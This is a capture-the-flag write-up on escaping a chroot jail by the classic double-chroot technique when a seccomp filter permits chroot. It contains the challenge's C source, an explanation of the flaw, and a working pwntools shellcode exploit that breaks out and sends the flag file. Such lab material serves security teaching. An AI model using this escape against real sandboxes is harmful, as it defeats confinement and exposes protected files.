#metadata(
  (
    title: "Classic Chroot Escape",
    description: "Using the classic double-chroot technique to escape a jail when the chroot syscall is allowed within the sandbox.",
    date: "2025-12-30",
    order: 7,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Classic Chroot Escape

== Challenge Source Code

```c
#include <assert.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp) {
  assert(argc > 0);

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 1);

  assert(argc > 1);

  // Checking to make sure you're not trying to open the flag.
  assert(strstr(argv[1], "flag") == NULL);

  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);

  char jail_path[] = "/tmp/jail-XXXXXX";
  assert(mkdtemp(jail_path) != NULL);

  assert(chroot(jail_path) == 0);

  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  void *shellcode =
      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANON, 0, 0);
  assert(shellcode == (void *)0x1337000);

  int shellcode_size = read(0, shellcode, 0x1000);

  scmp_filter_ctx ctx;

  ctx = seccomp_init(SCMP_ACT_KILL);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mkdir), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

  assert(seccomp_load(ctx) == 0);

  ((void (*)())shellcode)();
}
```

== Vulnerability Analysis

The challenge allows the `chroot` system call within the sandbox. This enables a classic "double chroot" escape.

```c
assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
```

The vulnerability relies on how the kernel handles directory traversal when `chroot` is used without `chdir`. If we are inside a chroot (Root A) and we call `chroot("subdir")` (New Root B), our current working directory (CWD) is technically outside the new root (it's still in Root A). Since we are "outside" the new root, the special handling of `..` (which prevents going above root) doesn't apply to the new root. This allows us to `chdir("..")` arbitrarily up to the real system root.

== Exploitation Plan

1. *Create Directory:* Create a new directory (e.g., "jail") inside the current root.
2. *Double Chroot:* Call `chroot` on this new directory. Crucially, do *not* call `chdir` into it yet.
3. *Break Out:* Call `chdir("../../../../../../../../../../../../../..")`. Since our CWD was outside the *new* root, we can traverse up past the old chroot boundary.
4. *Reset Root:* Call `chroot(".")` to set the process's root to the real system root we just reached.
5. *Retrieve Flag:* Open and read the flag.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

# Pass '/' to leak the root FD (though we might not need it for this escape)
p = process([exe, "/"])

# Shellcraft for Classic Chroot Escape
# 1. mkdir("esc")
sc = shellcraft.mkdir("esc", 0o755)
# 2. chroot("esc")
sc += shellcraft.chroot("esc")
# 3. chdir("../../../../../..") - Escaping to host root
sc += shellcraft.chdir("../../../../../..")
# 4. chroot(".") - Reset root to host root
sc += shellcraft.chroot(".")
# 5. open("flag", O_RDONLY)
sc += shellcraft.open("flag", constants.O_RDONLY)
# 6. sendfile(1, 'rax', 0, 100)
sc += shellcraft.sendfile(1, 'rax', 0, 100)
# 7. infinite loop
sc += "jmp ."

shellcode = asm(sc)
p.send(shellcode)

print(p.recvall(timeout=1).decode())
```
